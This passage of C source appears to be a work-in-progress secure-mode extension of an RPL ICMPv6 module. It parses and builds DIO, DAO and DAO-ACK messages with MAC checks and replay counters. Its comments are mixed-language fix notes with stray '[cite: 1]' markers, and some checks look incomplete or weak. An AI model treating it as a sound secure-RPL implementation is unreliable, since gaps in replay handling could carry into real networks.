        LOG_ERR("dio_input: malformed packet, discard\n");
        goto discard;
      }
      len = 2 + buffer[i + 1];
    }
    /* FIX: YAHAN BHI sec_len ADD KIYA HAI */

    if (len + i > buffer_length + sec_len)

    {
      LOG_ERR("dio_input: malformed packet, discard\n");
      goto discard;
    }

    switch (subopt_type)

    {
    case RPL_OPTION_DAG_METRIC_CONTAINER:
      if (len < 6)

      {
        LOG_WARN("dio_input: invalid DAG MC, len %u, discard\n", len);
        goto discard;
      }
      dio.mc.type = buffer[i + 2];
      dio.mc.flags = buffer[i + 3] << 1;
      dio.mc.flags |= buffer[i + 4] >> 7;
      dio.mc.aggr = (buffer[i + 4] >> 4) & 0x3;
      dio.mc.prec = buffer[i + 4] & 0xf;
      dio.mc.length = buffer[i + 5];

      if (dio.mc.type == RPL_DAG_MC_NONE)

      {
        /* No metric container: do nothing */
      }
      else if (dio.mc.type == RPL_DAG_MC_ETX)

      {
        if (len < 8)

        {
          LOG_WARN("dio_input: invalid DAG MC, len %u, discard\n", len);
          goto discard;
        }
        dio.mc.obj.etx = get16(buffer, i + 6);
      }
      else if (dio.mc.type == RPL_DAG_MC_ENERGY)

      {
        if (len < 8)

        {
          LOG_WARN("dio_input: invalid DAG MC, len %u, discard\n", len);
          goto discard;
        }
        dio.mc.obj.energy.flags = buffer[i + 6];
        dio.mc.obj.energy.energy_est = buffer[i + 7];
      }
      else
      {
        LOG_WARN("dio_input: unsupported DAG MC type %u, discard\n", (unsigned)dio.mc.type);
        goto discard;
      }
      break;
    case RPL_OPTION_ROUTE_INFO:
      if (len < 8)

      {
        LOG_WARN("dio_input: invalid route info option, len %u, discard\n",
                 len);
        goto discard;
      }

      /* The flags field includes the preference value. */
      dio.destination_prefix.length = buffer[i + 2];
      dio.destination_prefix.flags = buffer[i + 3];
      dio.destination_prefix.lifetime = get32(buffer, i + 4);

      if (((dio.destination_prefix.length + 7) / 8) + 8 <= len &&
          dio.destination_prefix.length <= 128)

      {
        memcpy(&dio.destination_prefix.prefix, &buffer[i + 8],
               (dio.destination_prefix.length + 7) / 8);
      }
      else
      {
        LOG_WARN("dio_input: invalid route info option, len %u, discard\n", len);
        goto discard;
      }

      break;
    case RPL_OPTION_DAG_CONF:
      if (len != 16)
      {
        LOG_WARN("dio_input: invalid DAG configuration option, len %u, discard\n", len);
        goto discard;
      }

      /* Parse the 'A' flag (Bit 3 of the 4th byte in the option)[cite: 1] */
      uint8_t auth_enabled = (buffer[i + 2] & 0x08) >> 3;
      if (auth_enabled && key_index == 0x00)
      {
        /* In Authenticated mode with a preinstalled key, a node MUST act only as a leaf[cite: 1]. */
        rpl_set_leaf_only(1);
      }

      dio.dag_intdoubl = buffer[i + 3];

      dio.dag_intmin = buffer[i + 4];
      dio.dag_redund = buffer[i + 5];
      dio.dag_max_rankinc = get16(buffer, i + 6);
      dio.dag_min_hoprankinc = get16(buffer, i + 8);
      dio.ocp = get16(buffer, i + 10);
      /* buffer + 12 is reserved */
      dio.default_lifetime = buffer[i + 13];
      dio.lifetime_unit = get16(buffer, i + 14);
      break;
    case RPL_OPTION_PREFIX_INFO:
      if (len != 32)

      {
        LOG_WARN("dio_input: invalid DAG prefix info, len %u, discard\n", len);
        goto discard;
      }
      dio.prefix_info.length = buffer[i + 2];
      if (dio.prefix_info.length > sizeof(uip_ipaddr_t) * 8)

      {
        LOG_WARN("dio_input: invalid DAG prefix info, len %u > %zu\n",
                 dio.prefix_info.length, sizeof(uip_ipaddr_t) * 8);
        goto discard;
      }

      dio.prefix_info.flags = buffer[i + 3];
      /* valid lifetime is ingnored for now - at i + 4 */
      /* preferred lifetime stored in lifetime */
      dio.prefix_info.lifetime = get32(buffer, i + 8);
      /* 32-bit reserved at i + 12 */
      memcpy(&dio.prefix_info.prefix, &buffer[i + 16], 16);
      break;
    default:
      LOG_WARN("dio_input: unsupported suboption type in DIO: %u, discard\n", (unsigned)subopt_type);
      goto discard;
    }
  }

  LOG_INFO("received a %s-DIO from ",
           uip_is_addr_mcast(&UIP_IP_BUF->destipaddr) ? "multicast" : "unicast");
  LOG_INFO_6ADDR(&from);
  LOG_INFO_(", instance_id %u, DAG ID ", (unsigned)dio.instance_id);
  LOG_INFO_6ADDR(&dio.dag_id);
  LOG_INFO_(", version %u, dtsn %u, rank %u\n",
            (unsigned)dio.version,
            (unsigned)dio.dtsn,
            (unsigned)dio.rank);

  rpl_process_dio(&from, &dio);

#if RPL_SECURITY
  if (nbr == NULL)

  {
    nbr = rpl_neighbor_get_from_ipaddr(&from);
    if (nbr != NULL)

    {
      nbr->sec_counter = counter;
    }
  }
#endif

discard:
  uipbuf_clear();
}
/*---------------------------------------------------------------------------*/
void rpl_icmp6_dio_output(uip_ipaddr_t *uc_addr)
{
  unsigned char *buffer;
  int pos;
  uip_ipaddr_t *addr = uc_addr;

#if RPL_SECURITY

  int sec_len;
  uint8_t sec_lvl;
  uint8_t ccm_nonce[RPL_NONCE_LENGTH];
  uint8_t mic_len; /* n-byte MAC length */

#endif

  /* Make sure we're up-to-date before sending data out */
  rpl_dag_update_state();

  if (rpl_get_leaf_only())

  {
    /* In leaf mode, we only send DIO messages as unicasts in response to
       unicast DIS messages. */
    if (uc_addr == NULL)

    {
      /* Do not send multicast DIO in leaf mode */
      return;
    }
  }

  /* DAG Information Object */
  pos = 0;

  buffer = UIP_ICMP_PAYLOAD;

#if RPL_SECURITY

  /* 1. Add Security Header based on whether replying to DIS or normal DIO */
  if (rpl_last_dis.responded == RPL_DIS_RESPONDED)

  {
    sec_len = add_security_section(RPL_TIMESTAMP_0, RPL_KIM_0,
                                   RPL_SEC_LVL, RPL_KEY_INDEX_0);
    sec_lvl = RPL_SEC_LVL;
  }
  else
  {
    /* Reply to a DIS with same security level */
    rpl_last_dis.responded = RPL_DIS_RESPONDED;
    sec_len = add_security_section(rpl_last_dis.timestamp, RPL_KIM_0,
                                   rpl_last_dis.lvl, rpl_last_dis.key_index);
    sec_lvl = rpl_last_dis.lvl;
  }
  pos += sec_len;
#endif

  buffer[pos++] = curr_instance.instance_id;
  buffer[pos++] = curr_instance.dag.version;

  set16(buffer, pos,
        rpl_get_leaf_only() ? RPL_INFINITE_RANK : curr_instance.dag.rank);
  pos += 2;

  buffer[pos] = curr_instance.dag.grounded ? RPL_DIO_GROUNDED : 0;
  buffer[pos] |= curr_instance.mop << RPL_DIO_MOP_SHIFT;
  buffer[pos] |= curr_instance.dag.preference & RPL_DIO_PREFERENCE_MASK;
  pos++;

  buffer[pos++] = curr_instance.dtsn_out;

  /* reserved 2 bytes */
  buffer[pos++] = 0; /* flags */
  buffer[pos++] = 0; /* reserved */

  memcpy(buffer + pos, &curr_instance.dag.dag_id, sizeof(curr_instance.dag.dag_id));
  pos += 16;

  if (!rpl_get_leaf_only())

  {
    if (curr_instance.mc.type != RPL_DAG_MC_NONE)

    {
      buffer[pos++] = RPL_OPTION_DAG_METRIC_CONTAINER;
      buffer[pos++] = 6;
      buffer[pos++] = curr_instance.mc.type;
      buffer[pos++] = curr_instance.mc.flags >> 1;
      buffer[pos] = (curr_instance.mc.flags & 1) << 7;
      buffer[pos++] |= (curr_instance.mc.aggr << 4) | curr_instance.mc.prec;
      if (curr_instance.mc.type == RPL_DAG_MC_ETX)

      {
        buffer[pos++] = 2;
        set16(buffer, pos, curr_instance.mc.obj.etx);
        pos += 2;
      }
      else if (curr_instance.mc.type == RPL_DAG_MC_ENERGY)

      {
        buffer[pos++] = 2;
        buffer[pos++] = curr_instance.mc.obj.energy.flags;
        buffer[pos++] = curr_instance.mc.obj.energy.energy_est;
      }
      else
      {
        LOG_ERR("unable to send DIO because of unsupported DAG MC type %u\n",
                (unsigned)curr_instance.mc.type);
        return;
      }
    }
  }

  /* Always add a DAG configuration option. */
  buffer[pos++] = RPL_OPTION_DAG_CONF;
  buffer[pos++] = 14;
  buffer[pos++] = 0; /* No Auth, PCS = 0 */
  buffer[pos++] = curr_instance.dio_intdoubl;
  buffer[pos++] = curr_instance.dio_intmin;
  buffer[pos++] = curr_instance.dio_redundancy;
  set16(buffer, pos, curr_instance.max_rankinc);
  pos += 2;
  set16(buffer, pos, curr_instance.min_hoprankinc);
  pos += 2;
  /* OCP is in the DAG_CONF option */
  set16(buffer, pos, curr_instance.of->ocp);
  pos += 2;
  buffer[pos++] = 0; /* reserved */
  buffer[pos++] = curr_instance.default_lifetime;
  set16(buffer, pos, curr_instance.lifetime_unit);
  pos += 2;

  /* Check if we have a prefix to send also. */
  if (curr_instance.dag.prefix_info.length > 0)

  {
    buffer[pos++] = RPL_OPTION_PREFIX_INFO;
    buffer[pos++] = 30; /* always 30 bytes + 2 long */
    buffer[pos++] = curr_instance.dag.prefix_info.length;
    buffer[pos++] = curr_instance.dag.prefix_info.flags;
    set32(buffer, pos, curr_instance.dag.prefix_info.lifetime);
    pos += 4;
    set32(buffer, pos, curr_instance.dag.prefix_info.lifetime);
    pos += 4;
    memset(&buffer[pos], 0, 4);
    pos += 4;
    memcpy(&buffer[pos], &curr_instance.dag.prefix_info.prefix, 16);
    pos += 16;
  }

  if (!rpl_get_leaf_only())

  {
    addr = addr != NULL ? addr : &rpl_multicast_addr;
  }

  LOG_INFO("sending a %s-DIO with rank %u to ",
           uc_addr != NULL ? "unicast" : "multicast",
           (unsigned)curr_instance.dag.rank);
  LOG_INFO_6ADDR(addr);
  LOG_INFO_("\n");

#if RPL_SECURITY
  /* 2. Set fields, generate Nonce and Encrypt */
  set_ip_icmp_fields(addr, RPL_CODE_SEC_DIO);

  LOG_INFO("RPL Security: Applying Message Authentication Code (MAC) for outgoing message to ");
  LOG_INFO_6ADDR(addr);
  LOG_INFO_(" using Outgoing Counter: %" PRIu32 "\n", rpl_sec_counter);
  set_ccm_nonce(ccm_nonce, rpl_sec_counter, sec_lvl, RPL_KIM_0);
  /* RFC 6550: Counter must not reach 0xFFFFFFFF */
  if (rpl_sec_counter >= 0xFFFFFFFE)
  {
    LOG_ERR("RPL Security: Outgoing Counter exhausted (0xFFFFFFFF). Triggering DODAG Local Repair.\n");
    /* Counter overflow hone par naye keys ya network reset ki zaroorat hoti hai */
    rpl_local_repair("Sec Counter Exhausted");
    return; /* Packet send cancel karein */
  }
  else
  {
    rpl_sec_counter++;
  }

  mic_len = sec_aead(ccm_nonce, pos - sec_len, sec_len, sec_lvl, RPL_ENCRYPT);
  pos += mic_len;

  uip_icmp6_send(addr, ICMP6_RPL, RPL_CODE_SEC_DIO, pos);
#else
  uip_icmp6_send(addr, ICMP6_RPL, RPL_CODE_DIO, pos);
#endif
}
/*---------------------------------------------------------------------------*/
static void
dao_input(void)
{
  struct rpl_dao dao;
  uint8_t subopt_type;
  unsigned char *buffer;
  uint16_t buffer_length;
  int pos;
  int len;
  int i;
  uip_ipaddr_t from;

#if RPL_SECURITY
  int sec_len = 0;
  uint8_t kim, lvl, key_index;
  uint32_t counter;
  uint8_t ccm_nonce[RPL_NONCE_LENGTH];
  uint8_t mic_len = 0;
#else
  int sec_len = 0;
#endif

  memset(&dao, 0, sizeof(dao));
  uip_ipaddr_copy(&from, &UIP_IP_BUF->srcipaddr);
  memset(&dao.parent_addr, 0, 16);

#if RPL_SECURITY
  rpl_remove_header();
#endif

  buffer = UIP_ICMP_PAYLOAD;
  pos = 0;

#if RPL_SECURITY
  /* 1. Parse Security Header */
  pos++;
  uint8_t algorithm = buffer[pos++]; // Byte 1 (Algorithm)

  kim = (buffer[pos] & RPL_KIM_MASK) >> RPL_KIM_SHIFT; // Byte 2 (KIM)
  lvl = (buffer[pos++] & RPL_LVL_MASK);                // Byte 2 (LVL)

  ++pos; // Byte 3 (Flags)

  /* Agar algorithm support nahi karte ho to drop kar sakte ho */
  if (algorithm != 0)
  {
    LOG_ERR("RPL: Unsupported Security Algorithm, discard\n");
    goto discard;
  }

  if (uip_ipaddr_cmp(&UIP_IP_BUF->srcipaddr, &UIP_IP_BUF->destipaddr))

  {
    LOG_ERR("RPL: Secure packet from myself, discard\n");
    goto discard;
  }
  /* The 'T' flag MUST be ignored if temporal checks are not supported by the node. */
  if (kim != 0 || lvl > 3)
  {
    LOG_ERR("RPL: Invalid Security parameters, discard\n");
    goto discard;
  }
  counter = get32(buffer, pos);
  pos += 4;

  if (counter == 0xFFFFFFFF) /* Changed from 0xffff */
  {
    LOG_ERR("RPL: Incoming security counter reaches maximum value, discard\n");
    goto discard;
  }

  key_index = buffer[pos++];
  LOG_INFO("RPL Security: Parsed Security Section from ");
  LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
  LOG_INFO_(" -> Key Identifier Mode (KIM): %u, Security Level (LVL): %u, Incoming Counter: %" PRIu32 ", Key Identifier: %u\n", kim, lvl, counter, key_index);
  if (key_index != 0)

  {
    LOG_ERR("RPL: key_index = %u, only preinstalled key allowed\n", key_index);
    goto discard;
  }

  sec_len = pos;
  mic_len = get_mic_len(lvl);
  buffer_length = uip_len - uip_l3_icmp_hdr_len - sec_len - mic_len;

  /* 2. Decrypt and Verify MAC */
  set_ip_icmp_fields(NULL, RPL_CODE_SEC_DAO);
  set_ccm_nonce(ccm_nonce, counter, lvl, kim);

  if (sec_aead(ccm_nonce, buffer_length, sec_len, lvl, RPL_DECRYPT) == 0)

  {
    LOG_ERR("RPL: MIC mismatch! Packet dropped.\n");
    goto discard;
  }

  /* --- REPLAY PROTECTION & RESYNC CHECK START --- */
  rpl_nbr_t *nbr = rpl_neighbor_get_from_ipaddr(&from);

  if (counter == 0)
  {
    if (nbr != NULL)
    {
      /* CASE 1: Purana neighbor reboot hua hai. CC Request bhej kar resync initiate karo. */
      LOG_INFO("RPL Security: Incoming Counter is zero, indicating possible node reset from ");
      LOG_INFO_6ADDR(&from);
      LOG_INFO_(". Initiating Consistency Check (CC) Resynchronization.\n");
      LOG_INFO_(" | Fields: Counter = %" PRIu32 ", KeyIdx = %u. Initiating Resync (CC Response).\n", counter, key_index);
      /* Naya random nonce generate karo CC Request ke liye */
      uint16_t out_nonce = random_rand();

      /* CC RESPONSE bhejna zaroori hai taaki sender apna counter update kar sake */
      cc_output(&from, RPL_CC_RESPONSE, out_nonce, nbr->sec_counter,
                curr_instance.used ? curr_instance.instance_id : 0,
                curr_instance.used ? &curr_instance.dag.dag_id : NULL);

      goto discard; /* Purana packet (DIO/DAO) drop karo kyunki counter sync nahi hai */
    }
  }
  else
  {
    /* Normal Replay Check (Jab counter 0 nahi hai) */
    if (nbr != NULL)
    {
      if (counter <= nbr->sec_counter)
      {
        /* RFC 6550 Sec 10.7: Replay protection violation. */
        LOG_ERR("RPL Security: Replay protection violation. Incoming Counter (%" PRIu32 ") is <= Stored Watermark (%" PRIu32 "). Discarding message.\n", counter, nbr->sec_counter);
        goto discard;
      }
      else
      {
        LOG_INFO("RPL Security: Counter validation successful. Updating Stored Watermark to %" PRIu32 ".\n", counter);
        nbr->sec_counter = counter;
      }
    }
    else
    {
      LOG_INFO("RFC6550-SEC: New Neighbor detected with valid counter: %" PRIu32 ".\n", counter);
      /* Dhyan rahe: Jab naya neighbor pehli baar accept ho raha hai, toh base parsing
         (jaise rpl_process_dio) ke baad nbr->sec_counter = counter; zaroor set ho jaye */
    }
  }
  /* --- REPLAY PROTECTION & RESYNC CHECK END --- */

#else
  buffer_length = uip_len - uip_l3_icmp_hdr_len;
#endif

  if (buffer_length < 4)

  {
    LOG_WARN("dao_input: invalid DAO header, len %" PRIu16 ", discard\n",
             buffer_length);
    goto discard;
  }

  /* Extract Instance ID AFTER security header */
  dao.instance_id = buffer[sec_len];
  if (!curr_instance.used || curr_instance.instance_id != dao.instance_id)

  {
    LOG_ERR("dao_input: unknown RPL instance %u, discard\n", dao.instance_id);
    goto discard;
  }

  /* Set position right after security header (if any) */
  pos = sec_len;
  pos++; /* instance ID */
  dao.lifetime = curr_instance.default_lifetime;
  dao.flags = buffer[pos++];
  pos++; /* reserved */
  dao.sequence = buffer[pos++];

  /* Is the DAG ID present? */
  if (dao.flags & RPL_DAO_D_FLAG)

  {
    if (buffer_length < 4 + sizeof(curr_instance.dag.dag_id))

    {
      LOG_WARN("dao_input: missing full DAG ID, len %" PRIu16 ", discard\n",
               buffer_length);
      goto discard;
    }
    if (memcmp(&curr_instance.dag.dag_id, &buffer[pos], sizeof(curr_instance.dag.dag_id)))

    {
      LOG_ERR("dao_input: different DAG ID ");
      LOG_ERR_6ADDR((uip_ipaddr_t *)&buffer[pos]);
      LOG_ERR_(", discard\n");
      goto discard;
    }
    pos += 16;
  }

  /* Check if there are any RPL options present. */
  for (i = pos; i < buffer_length + sec_len; i += len)

  {
    subopt_type = buffer[i];
    if (subopt_type == RPL_OPTION_PAD1)

    {
      len = 1;
    }
    else
    {
      /* The option consists of a two-byte header and a payload. */
      if (i + 1 >= buffer_length + sec_len)

      {
        LOG_ERR("dao_input: malformed packet, discard\n");
        goto discard;
      }
      len = 2 + buffer[i + 1];
    }

    if (i + len > buffer_length + sec_len)

    {
      LOG_ERR("dao_input: malformed packet, discard\n");
      goto discard;
    }

    switch (subopt_type)

    {
    case RPL_OPTION_TARGET:
      /* Handle the target option. */
      if (len < 4)

      {
        LOG_WARN("dao_input: invalid target option, len %u, discard\n", len);
        goto discard;
      }
      dao.prefixlen = buffer[i + 3];
      if (4 + (dao.prefixlen + 7) / CHAR_BIT != len)

      {
        LOG_WARN("dao_input: invalid target option, len %u != %u, discard\n",
                 len, 4 + (dao.prefixlen + 7) / CHAR_BIT);
        goto discard;
      }
      memset(&dao.prefix, 0, sizeof(dao.prefix));
      memcpy(&dao.prefix, buffer + i + 4, (dao.prefixlen + 7) / CHAR_BIT);
      break;
    case RPL_OPTION_TRANSIT:
      /* The path sequence and control are ignored. */
      if (len < 6)

      {
        LOG_WARN("dao_input: invalid transit option, len %" PRIu16 ", discard\n",
                 buffer_length);
        goto discard;
      }
      dao.lifetime = buffer[i + 5];
      if (len >= 20)

      {
        memcpy(&dao.parent_addr, buffer + i + 6, 16);
      }
      break;
    }
  }

  /* Destination Advertisement Object */
  LOG_INFO("received a %sDAO from ", dao.lifetime == 0 ? "No-path " : "");
  LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
  LOG_INFO_(", seqno %u, lifetime %u, prefix ", dao.sequence, dao.lifetime);
  LOG_INFO_6ADDR(&dao.prefix);
  LOG_INFO_(", prefix length %u, parent ", dao.prefixlen);
  LOG_INFO_6ADDR(&dao.parent_addr);
  LOG_INFO_(" \n");

  rpl_process_dao(&from, &dao);

#if RPL_SECURITY
  if (nbr == NULL)

  {
    nbr = rpl_neighbor_get_from_ipaddr(&from);
    if (nbr != NULL)

    {
      nbr->sec_counter = counter;
    }
  }
#endif

discard:
  uipbuf_clear();
}

/*---------------------------------------------------------------------------*/
void rpl_icmp6_dao_output(uint8_t lifetime)
{
  unsigned char *buffer;
  uint8_t prefixlen;
  int pos;
  const uip_ipaddr_t *prefix = rpl_get_global_address();
  uip_ipaddr_t *parent_ipaddr = rpl_neighbor_get_ipaddr(curr_instance.dag.preferred_parent);

#if RPL_SECURITY
  int sec_len;
  uint8_t ccm_nonce[RPL_NONCE_LENGTH];
  uint8_t mic_len; /* n-byte MAC length */
#endif

  /* Make sure we're up-to-date before sending data out */
  rpl_dag_update_state();

  if (!curr_instance.used)

  {
    LOG_WARN("rpl_icmp6_dao_output: not in an instance, skip sending DAO\n");
    return;
  }

  if (curr_instance.dag.preferred_parent == NULL)

  {
    LOG_WARN("rpl_icmp6_dao_output: no preferred parent, skip sending DAO\n");
    return;
  }

  if (prefix == NULL || parent_ipaddr == NULL || curr_instance.mop == RPL_MOP_NO_DOWNWARD_ROUTES)

  {
    LOG_WARN("rpl_icmp6_dao_output: node not ready to send a DAO (prefix %p, parent addr %p, mop %u)\n",
             prefix, parent_ipaddr, curr_instance.mop);
    return;
  }

  buffer = UIP_ICMP_PAYLOAD;
  pos = 0;

#if RPL_SECURITY
  /* 1. Add Security Header */
  sec_len = add_security_section(RPL_TIMESTAMP_0, RPL_KIM_0,
                                 RPL_SEC_LVL, RPL_KEY_INDEX_0);
  pos += sec_len;
#endif

  buffer[pos++] = curr_instance.instance_id;
  buffer[pos] = 0;
#if RPL_WITH_DAO_ACK
  if (lifetime != 0)
  {
    buffer[pos] |= RPL_DAO_K_FLAG;
  }
#endif /* RPL_WITH_DAO_ACK */

  /* The 'D' flag MUST be set when a local RPLInstanceID is used[cite: 1]. */
  if (curr_instance.instance_id & RPL_INSTANCE_LOCAL_FLAG)
  {
    buffer[pos] |= RPL_DAO_D_FLAG;
  }
  ++pos;
  buffer[pos++] = 0; /* reserved */
  buffer[pos++] = curr_instance.dag.dao_last_seqno;

  /* If the 'D' flag is set, the 128-bit DODAGID field is present[cite: 1]. */
  if (curr_instance.instance_id & RPL_INSTANCE_LOCAL_FLAG)
  {
    memcpy(buffer + pos, &curr_instance.dag.dag_id, 16);
    pos += 16;
  }

  /* create target subopt */
  prefixlen = sizeof(*prefix) * CHAR_BIT;
  buffer[pos++] = RPL_OPTION_TARGET;
  buffer[pos++] = 2 + ((prefixlen + 7) / CHAR_BIT);
  buffer[pos++] = 0; /* reserved */
  buffer[pos++] = prefixlen;
  memcpy(buffer + pos, prefix, (prefixlen + 7) / CHAR_BIT);
  pos += ((prefixlen + 7) / CHAR_BIT);

  /* Create a transit information sub-option. */
  buffer[pos++] = RPL_OPTION_TRANSIT;
  buffer[pos++] = 20;
  buffer[pos++] = 0; /* flags - ignored */
  buffer[pos++] = 0; /* path control - ignored */
  buffer[pos++] = 0; /* path seq - ignored */
  buffer[pos++] = lifetime;

  /* Include parent global IP address */
  memcpy(buffer + pos, &curr_instance.dag.dag_id, 8); /* Prefix */
  pos += 8;
  memcpy(buffer + pos, ((const unsigned char *)parent_ipaddr) + 8, 8); /* Interface identifier */
  pos += 8;

  LOG_INFO("sending a %sDAO seqno %u, tx count %u, lifetime %u, prefix ",
           lifetime == 0 ? "No-path " : "",
           curr_instance.dag.dao_last_seqno, curr_instance.dag.dao_transmissions, lifetime);
  LOG_INFO_6ADDR(prefix);
  LOG_INFO_(" to ");
  LOG_INFO_6ADDR(&curr_instance.dag.dag_id);
  LOG_INFO_(", parent ");
  LOG_INFO_6ADDR(parent_ipaddr);
  LOG_INFO_("\n");

#if RPL_SECURITY
  /* 2. Set fields, generate Nonce and Encrypt */
  set_ip_icmp_fields(&curr_instance.dag.dag_id, RPL_CODE_SEC_DAO);
  LOG_INFO("RFC6550-SEC: Encrypting outgoing DAO to ");
  LOG_INFO_6ADDR(&curr_instance.dag.dag_id);
  LOG_INFO_(" using Local Outgoing Counter(Sec_Header): %" PRIu32 "\n", rpl_sec_counter);

  set_ccm_nonce(ccm_nonce, rpl_sec_counter, RPL_SEC_LVL, RPL_KIM_0);
  /* RFC 6550: Counter must not reach 0xFFFFFFFF */
  if (rpl_sec_counter >= 0xFFFFFFFE)
  {
    LOG_ERR("RPL Security: Outgoing Counter exhausted (0xFFFFFFFF). Triggering DODAG Local Repair.\n");
    /* Counter overflow hone par naye keys ya network reset ki zaroorat hoti hai */
    rpl_local_repair("Sec Counter Exhausted");
    return; /* Packet send cancel karein */
  }
  else
  {
    rpl_sec_counter++;
  }

  mic_len = sec_aead(ccm_nonce, pos - sec_len, sec_len, RPL_SEC_LVL, RPL_ENCRYPT);
  pos += mic_len;

  /* Send Secure DAO to root (IPv6 address is DAG ID) */
  uip_icmp6_send(&curr_instance.dag.dag_id, ICMP6_RPL, RPL_CODE_SEC_DAO, pos);
#else
  /* Send Unsecure DAO to root (IPv6 address is DAG ID) */
  uip_icmp6_send(&curr_instance.dag.dag_id, ICMP6_RPL, RPL_CODE_DAO, pos);
#endif
}

#if RPL_WITH_DAO_ACK
/*---------------------------------------------------------------------------*/
static void
dao_ack_input(void)
{
  uint8_t *buffer;
  uint8_t instance_id;
  uint8_t sequence;
  uint8_t status;

#if RPL_SECURITY
  int sec_len = 0;
  int pos = 0;
  uint8_t kim, lvl, key_index;
  uint32_t counter;
  uint8_t ccm_nonce[RPL_NONCE_LENGTH];
  uint8_t mic_len = 0;
  uint16_t buffer_length;
#else
  int sec_len = 0;
#endif

#if RPL_SECURITY
  rpl_remove_header(); /* <---- YAHAN ADD KAREIN! */
#endif

  buffer = UIP_ICMP_PAYLOAD;

#if RPL_SECURITY
  /* 1. Parse Security Header Correctly */
  pos++;
  uint8_t algorithm = buffer[pos++]; // Byte 1 (Algorithm)

  kim = (buffer[pos] & RPL_KIM_MASK) >> RPL_KIM_SHIFT; // Byte 2 (KIM)
  lvl = (buffer[pos++] & RPL_LVL_MASK);                // Byte 2 (LVL)

  ++pos; // Byte 3 (Flags)

  /* Agar algorithm support nahi karte ho to drop kar sakte ho */
  if (algorithm != 0)
  {
    LOG_ERR("RPL: Unsupported Security Algorithm, discard\n");
    goto discard;
  }

  if (uip_ipaddr_cmp(&UIP_IP_BUF->srcipaddr, &UIP_IP_BUF->destipaddr))

  {
    LOG_ERR("RPL: Secure packet from myself, discard\n");
    goto discard;
  }

  /* The 'T' flag MUST be ignored if temporal checks are not supported by the node. */
  if (kim != 0 || lvl > 3)
  {
    LOG_ERR("RPL: Invalid Security parameters, discard\n");
    goto discard;
  }

  counter = get32(buffer, pos);
  pos += 4;

  if (counter == 0xFFFFFFFF) /* Changed from 0xffff */
  {
    LOG_ERR("RPL: Incoming security counter reaches maximum value, discard\n");
    goto discard;
  }

  key_index = buffer[pos++];
  LOG_INFO("RPL Security: Parsed Security Section from ");
  LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
  LOG_INFO_(" -> Key Identifier Mode (KIM): %u, Security Level (LVL): %u, Incoming Counter: %" PRIu32 ", Key Identifier: %u\n", kim, lvl, counter, key_index);
  if (key_index != 0)

  {
    LOG_ERR("RPL: key_index = %u, only preinstalled key allowed\n", key_index);
    goto discard;
  }

  sec_len = pos;
  mic_len = get_mic_len(lvl);
  buffer_length = uip_len - uip_l3_icmp_hdr_len - sec_len - mic_len;

  /* 2. Decrypt and Verify MAC */
  set_ip_icmp_fields(NULL, RPL_CODE_SEC_DAO_ACK);
  set_ccm_nonce(ccm_nonce, counter, lvl, kim);

  if (sec_aead(ccm_nonce, buffer_length, sec_len, lvl, RPL_DECRYPT) == 0)

  {
    LOG_ERR("RPL: MIC mismatch! Packet dropped.\n");
    goto discard;
  }

  uip_ipaddr_t from;
  uip_ipaddr_copy(&from, &UIP_IP_BUF->srcipaddr);

  /* --- REPLAY PROTECTION & RESYNC CHECK START --- */
  rpl_nbr_t *nbr = rpl_neighbor_get_from_ipaddr(&from);

  if (counter == 0)
  {
    if (nbr != NULL)
    {
      /* CASE 1: Purana neighbor reboot hua hai. CC Request bhej kar resync initiate karo. */
      LOG_INFO("RPL Security: Incoming Counter is zero, indicating possible node reset from ");
      LOG_INFO_6ADDR(&from);
      LOG_INFO_(". Initiating Consistency Check (CC) Resynchronization.\n");
      LOG_INFO_(" | Fields: Counter = %" PRIu32 ", KeyIdx = %u. Initiating Resync (CC Response).\n", counter, key_index);
      /* Naya random nonce generate karo CC Request ke liye */
      uint16_t out_nonce = random_rand();

      /* CC RESPONSE bhejna zaroori hai taaki sender apna counter update kar sake */
      cc_output(&from, RPL_CC_RESPONSE, out_nonce, nbr->sec_counter,
                curr_instance.used ? curr_instance.instance_id : 0,
                curr_instance.used ? &curr_instance.dag.dag_id : NULL);

      goto discard; /* Purana packet (DIO/DAO) drop karo kyunki counter sync nahi hai */
    }
  }
  else
  {
    /* Normal Replay Check (Jab counter 0 nahi hai) */
    if (nbr != NULL)
    {
      if (counter <= nbr->sec_counter)
      {
        /* RFC 6550 Sec 10.7: Replay protection violation. */
        LOG_ERR("RPL Security: Replay protection violation. Incoming Counter (%" PRIu32 ") is <= Stored Watermark (%" PRIu32 "). Discarding message.\n", counter, nbr->sec_counter);
        goto discard;
      }
      else
      {
        LOG_INFO("RPL Security: Counter validation successful. Updating Stored Watermark to %" PRIu32 ".\n", counter);
        nbr->sec_counter = counter;
      }
    }
    else
    {
      LOG_INFO("RFC6550-SEC: New Neighbor detected with valid counter: %" PRIu32 ".\n", counter);
      /* Dhyan rahe: Jab naya neighbor pehli baar accept ho raha hai, toh base parsing
         (jaise rpl_process_dio) ke baad nbr->sec_counter = counter; zaroor set ho jaye */
    }
  }
  /* --- REPLAY PROTECTION & RESYNC CHECK END --- */

#endif

  /* 3. Read data AFTER security header */
  instance_id = buffer[sec_len];
  uint8_t flags = buffer[sec_len + 1];
  sequence = buffer[sec_len + 2];
  status = buffer[sec_len + 3];

  int offset = sec_len + 4;

  /* The 'D' flag indicates that the DODAGID field is present[cite: 1]. */
  if (flags & RPL_DAO_D_FLAG)
  {
    /* Skip the 16-byte DODAGID to properly align for any future options[cite: 1]. */
    offset += 16;
  }

  /* Use 'offset' if you ever need to parse DAO-ACK Options later. */

  if (!curr_instance.used || curr_instance.instance_id != instance_id)

  {
    LOG_ERR("dao_ack_input: unknown instance, discard\n");
    goto discard;
  }

  LOG_INFO("received a DAO-%s with seqno %d (%d %d) and status %d from ",
           status < RPL_DAO_ACK_UNABLE_TO_ACCEPT ? "ACK" : "NACK", sequence,
           curr_instance.dag.dao_last_seqno, curr_instance.dag.dao_last_seqno, status);
  LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
  LOG_INFO_("\n");

  rpl_process_dao_ack(sequence, status);

discard:
  uipbuf_clear();
}
/*---------------------------------------------------------------------------*/
void rpl_icmp6_dao_ack_output(uip_ipaddr_t *dest, uint8_t sequence, uint8_t status)
{
  unsigned char *buffer;
  int pos = 0;

#if RPL_SECURITY
  int sec_len;
  uint8_t ccm_nonce[RPL_NONCE_LENGTH];
  uint8_t mic_len; /* n-byte MAC length */
#endif

  /* Make sure we're up-to-date before sending data out */
  rpl_dag_update_state();

